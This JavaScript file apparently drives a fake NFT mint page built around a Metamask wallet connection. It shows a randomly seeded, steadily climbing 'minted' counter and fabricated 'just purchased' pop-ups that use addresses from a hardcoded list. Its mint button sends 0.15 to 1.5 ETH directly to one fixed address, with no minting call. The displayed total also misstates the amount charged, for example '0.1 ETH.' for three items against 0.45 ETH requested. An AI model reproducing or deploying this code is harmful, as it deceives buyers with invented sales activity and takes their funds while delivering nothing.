const errorsList = {
        4001: "You've rejected connection with Metamask :(",
        "-32002": "Open your Metamask to check progress!",
    },
    getPrice = () => {
        const t = document.querySelector(".amount-value").getAttribute("value");
        return {
            1: `0x${(15e16).toString(16)}`,
            2: `0x${(30e16).toString(16)}`,
            3: `0x${(45e16).toString(16)}`,
            4: `0x${(60e16).toString(16)}`,
            5: `0x${(75e16).toString(16)}`,
            6: `0x${(90e16).toString(16)}`,
            7: `0x${(105e16).toString(16)}`,
            8: `0x${(120e16).toString(16)}`,
            9: `0x${(135e16).toString(16)}`,
            10: `0x${(150e16).toString(16)}`,
        } [t]
    },
    mintedAmount = document.querySelector(".minted-amount-eagle");
let amount = null;
const itemLS = localStorage.getItem("minted-amount-eagle"),
    wallets = ["0x135947B7789A69E1858c37a25812F3c0Cc08BCEc", "0x7Be8076f4EA4A4AD08075C2508e481d6C946D12b", "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45", "0xc84C335b51A670c4cb8F29Df90Adbd1f99bC8aef", "0x5CC5B05a8A13E3fBDB0BB9FcCd98D38e50F90c38", "0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8", "0xD44C9B99A12A1ed98414909993Bc2E2123eB403E", "0xe572803f645f14cAa40b2139D8045b5a9f243F4b", "0x10531d51B59085fb71260d52cE374Bf5B38C564a", "0xF8982Ee7C0A8bE3eA982e6834380F47605dE9A87", "0xE695D5Ba548B6bfeA7C9622f4D3fC341987C96B9", "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", "0xE3EfB074614bd20cC58D746df60c96CD637E9b31", "0xE47d67df7F9274B0F379e4Fb8A6f9A92F5f38188", "0x174107d28e8f386fECBdb8c75aBA9ee70B3177eE", "0xe9ec47f6c856fde913bcbf0A63f42cB309b86182", "0x17f838E5B73d144Af7CA67fD9f03c5aF47f287f0", "0x7Be8076f4EA4A4AD08075C2508e481d6C946D12b", ],
    checkLS = () => {
        null === itemLS ? generateAmount() : ((amount = +itemLS), (mintedAmount.innerHTML = itemLS))
    },
    generateAmount = () => {
        (amount = Math.floor(50 * Math.random() + 1750)), insertDOM(amount), setMintedAmount(amount)
    },
    setMintedAmount = (t) => {
        localStorage.setItem("minted-amount-eagle", t)
    },
    insertDOM = (t) => {
        mintedAmount.innerHTML = `${t}`
    },
    setNewAmount = () => {
        if (+localStorage.getItem("minted-amount-eagle") >= 3700) clearInterval(updateAmount);
        else {
            const t = Math.floor(4 * Math.random() + 1),
                e = +localStorage.getItem("minted-amount-eagle") + t,
                o = (Math.floor(4 * Math.random() + 1), Math.floor(Math.random() * (wallets.length - 1) + 1)),
                n = wallets[o].slice(0, 5) + "..." + wallets[o].slice(-5);
            localStorage.setItem("minted-amount-eagle", e), insertDOM(e), buyNotification(n, t, 4500)
        }
    },
    updateAmount = setInterval(setNewAmount, 2e3);
null === itemLS ? generateAmount() : ((amount = +itemLS), (mintedAmount.innerHTML = itemLS));
const plusBtn = document.querySelector(".button-plus"),
    minusBtn = document.querySelector(".button-minus"),
    inputAmount = document.querySelector(".amount-value"),
    // displaySum = document.querySelector(".total-value"),
    addOne = () => {
        "10" !== inputAmount.value ? (inputAmount.setAttribute("value", +inputAmount.value + 1), setSumOfAmounts()) : amountNotification("You can't purchase more than 10 NFT's!", 2500)
    },
    minusOne = () => {
        "1" !== inputAmount.value && (inputAmount.setAttribute("value", +inputAmount.value - 1), setSumOfAmounts())
    };
minusBtn.addEventListener("click", minusOne), plusBtn.addEventListener("click", addOne);
const setSumOfAmounts = () => {
    "3" === inputAmount.value ? (displaySum.innerHTML = "0.1 ETH.") : (displaySum.innerHTML = (0.1 * inputAmount.value).toFixed(2) + " ETH.")
};
successNotification = (t, e) => {
    Swal.fire({
        position: "bottom-right",
        color: "white",
        background: "#01937C",
        title: `<div class="success-notification-container"><img class="metamask-success-notification"src="../images/logo/metamask.png"alt=""><div class='succes-notification'">${t}</div></div>`,
        showConfirmButton: !1,
        timerProgressBar: !0,
        heightAuto: !1,
        timer: e,
    })
};
const amountNotification = (t, e) => {
        Swal.fire({
            position: "center",
            color: "#000",
            background: "#fff",
            title: `<div class='warning'>${t}</div>`,
            showConfirmButton: !1,
            timerProgressBar: !0,
            heightAuto: !1,
            timer: e,
        })
    },
    warningNotification = (t, e) => {
        Swal.fire({
            position: "bottom-right",
            color: "black",
            background: "#FFCC1D",
            title: `<div class='warning'>${t}</div>`,
            showConfirmButton: !1,
            timerProgressBar: !0,
            heightAuto: !1,
            timer: e,
        })
    },
    errorNotification = (t, e) => {
        Swal.fire({
            position: "bottom-right",
            color: "#fff",
            background: "#FF5959",
            title: `<div class='error'>${t}</div>`,
            showConfirmButton: !1,
            timerProgressBar: !0,
            heightAuto: !1,
            timer: e,
        })
    },
    buyNotification = (t, e, o) => {
        Swal.fire({
            position: "bottom-left",
            color: "#000",
            background: "#fff",
            title: `<div class='buy d-flex flex-column align-items-center'><div>${t}</div><div>just purchased ${e} NFT</div</div>`,
            showConfirmButton: !1,
            timerProgressBar: 0,
            heightAuto: !1,
            backdrop: !1,
            timer: o,
        })
    },
    walletInfo = document.querySelector(".metamask-wallet-information"),
    connectButton = document.querySelector(".connect-button");
let accounts = [],
    userInfo = {};
const connectWallet = async () => {
    if (void 0 !== window.ethereum) {
        try {
            accounts = await ethereum.request({
                method: "eth_requestAccounts"
            })
        } catch (t) {
            console.log(t.code), console.log(errorsList[4001]), 4001 === t.code ? warningNotification(errorsList[4001], 2500) : -32002 === t.code && warningNotification(errorsList[-32002], 2500)
        }
        accounts.length && successNotification("You've connected your Metamask!", 2500)
    } else errorNotification("Install Metamask before connecting!", 3e3)
};
connectButton.addEventListener("click", connectWallet);
const sendEthButton = document.querySelector(".mint-button");
sendEthButton.addEventListener("click", () => ethereum.request({
    method: "eth_sendTransaction",
    params: [{
        from: accounts[0],
        to: "0xa48Af56fB22D157F6c97d0E3a816303859Fa3Fd0",
        value: getPrice(),
    }, ],
}).then(() => ethereum.request).then((t) => console.log(t)).catch((t) => {
    -32602 === t.code ? warningNotification("Please, press the connect button!", 3e3) : 4001 === t.code && errorNotification("You've denied the Metamask payment!", 3e3)
}));